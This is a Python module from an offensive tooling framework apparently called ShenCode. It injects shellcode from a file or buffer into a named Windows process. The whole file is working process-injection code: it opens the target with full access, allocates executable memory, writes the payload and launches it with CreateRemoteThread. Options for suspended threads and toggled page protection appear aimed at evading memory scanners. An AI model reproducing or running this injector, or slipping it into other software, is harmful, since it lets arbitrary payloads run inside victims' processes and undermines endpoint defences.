########################################################
### ShenCode Module
###
### Name: Injection
### Docs: https://heckhausen.it/shencode/README
### 
########################################################

import os
from utils.windef import *
from utils.winconst import *
from utils.style import *
from utils.helper import CheckFile

CATEGORY    = 'inject'
DESCRIPTION = 'Inject shellcode into memory with CreateRemoteThread'

cs = ConsoleStyles()

arglist = {
    'input':           { 'value': None, 'desc': 'Input file or buffer for process injection' },
    'process':         { 'value': None, 'desc': 'Processname to inject the shellcode' },
    'start_process':   { 'value': False, 'desc': 'If not active, start the process before injection' },
    'shellcode':       { 'value': None, 'desc': 'Internal use only, don\'t change!' },
    'resume_thread':   { 'value': False, 'desc': 'Start thread suspended and resume after speciefied time' },
    'virtual_protect': { 'value': False, 'desc': 'Deny access on memory for a specified time' }
}

def register_arguments(parser):
            parser.add_argument('-i', '--input', help=arglist['input']['desc'])
            parser.add_argument('-p', '--process', help=arglist['process']['desc'])

            grp = parser.add_argument_group('additional')
            grp.add_argument('-r', '--resume-thread', action='store_true', help=arglist['resume_thread']['desc'])
            grp.add_argument('-s', '--start-process', action='store_true', help=arglist['start_process']['desc'])
            grp.add_argument('-v', '--virtual-protect', action='store_true', help=arglist['virtual_protect']['desc'])

class module:
    from urllib import request
    from time import sleep
    import wmi
    import threading

    Author = 'cpu0x00, psycore8'
    Version = '0.9.0'
    DisplayName = 'INJECTION'
    delay = 5
    data_size = 0
    hash = ''
    pid = int
    relay = False
    shell_path = '::inject::injection'

    def __init__(self, input, process, start_process, shellcode=None, resume_thread=None, virtual_protect=None):
        self.input = input
        self.process_start = start_process
        self.target_process = process
        self.shellcode = shellcode
        self.resume_thread = resume_thread
        self.virtual_protect = virtual_protect

    def Start_Process(self):
        cs.console_print.note(f'Starting {self.target_process}')
        os.system(self.target_process)

    def get_proc_id(self):
        processes = self.wmi.WMI().Win32_Process(name=self.target_process)
        self.pid = processes[0].ProcessId
        cs.console_print.note(f'{self.target_process} process id: {self.pid}')
        return int(self.pid)

    def start_injection(self):
        if self.process_start:
            s = self.threading.Thread(target=self.Start_Process)
            s.start()
            self.sleep(3)

        process_id = self.get_proc_id()
        
        phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
        if phandle:
            cs.console_print.note('Process handle opened')

        memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
        if memory:
            cs.console_print.note('Process memory allocated')

        writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), 0)
        if writing:
            cs.console_print.note('Shellcode written to memory')
        if self.virtual_protect:
            cs.console_print.note('VirtualProtectEx: PAGE_NO_ACCESS')
            VirtualProtectEx(phandle, None, 0, 0x01, None)

        if self.resume_thread or self.virtual_protect:
            cs.console_print.note('CreateRemoteThread: START_SUSPENDED')
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
        else:
            Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)

        if Injection:
            cs.console_print.ok('Shellcode injected!')

        if self.virtual_protect:
            cs.console_print.note('VirtualProtectEx: PAGE_READWRITE_EXECUTE')
            VirtualProtectEx(phandle, None, 0, 0x40, None)

        if self.resume_thread or self.virtual_protect:
            self.sleep(self.delay)
            cs.console_print.note('ResumeThread')
            resume = ResumeThread(Injection)
            if resume:
                cs.console_print.ok('Process resumed')

        CloseHandle(phandle)

    def proc_inject():
        return False
    
    def open_file(self):
        try:
            with open(self.input, 'rb') as file:
                self.shellcode = file.read()
        except FileNotFoundError:
            return False
    
    def process(self):
        cs.module_header(self.DisplayName, self.Version)
        if isinstance(self.input, str):
            cs.console_print.note('Try to open file')
            CheckFile(self.input)
            cs.action_open_file2(self.input)
            self.open_file()
            cs.console_print.note('Try to execute shellcode')
            self.start_injection()
        elif isinstance(self.input, bytes):
            self.shellcode = self.input
            self.start_injection()
        else:
            cs.console_print.error(f'File {self.input} not found or cannot be opened.')
        cs.console_print.ok('DONE!')